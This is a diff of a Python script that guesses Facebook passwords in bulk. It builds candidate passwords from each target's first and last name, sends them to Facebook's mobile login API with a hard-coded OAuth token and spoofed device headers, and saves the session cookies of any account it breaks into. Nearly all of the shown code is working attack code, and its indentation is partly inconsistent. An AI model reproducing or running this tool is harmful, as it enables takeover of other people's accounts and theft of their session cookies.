@@ -389,28 +389,34 @@ def newidx(ids,names,passlist):
 			ln = fn
 		for pw in passlist:
 			pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
-			headers_freefb = {
-    'authority': 'mbasic.facebook.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9',
-    'cache-control': 'max-age=0',
-    'dpr': '2',
-    'sec-ch-prefers-color-scheme': 'dark',
-    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
-    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-model': '"RMX2030"',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"10.0.0"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
-    'viewport-width': '980',
-}
-    po = requests.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head).json()
+			head={'User-Agent':sex(), 
+            'Accept-Encoding': 'gzip, deflate', 
+            'Accept': '*/*', 
+            'Connection': 'keep-alive',
+            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
+            'X-FB-Friendly-Name': 'authenticate', 
+            'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)), 
+            'X-FB-Net-HNI': str(random.randint(20000, 40000)), 
+            'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 
+            'X-FB-Connection-Type': 'SEVEN',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'X-FB-HTTP-Engine': 'Liger'}
+			data={'adid': str(uuid.uuid4()),
+            'format': 'json',
+            'device_id': str(uuid.uuid4()),
+            'email': ids,
+            'password': pas,
+            'generate_analytics_claims': '1', 
+            'credentials_type': 'password',
+            'source': 'login',
+            'error_detail_type': 'button_with_disabled',
+            'enroll_misauth': 'false', 
+            'generate_session_cookies': '1',
+            'generate_machine_id': '1',
+            'meta_inf_fbmeta': '', 
+            'currently_logged_in_userid': '0', 
+            'fb_api_req_friendly_name': 'authenticate'}
+    po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
 			if 'session_key' in po:
 				uid = str(po['uid'])
 				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
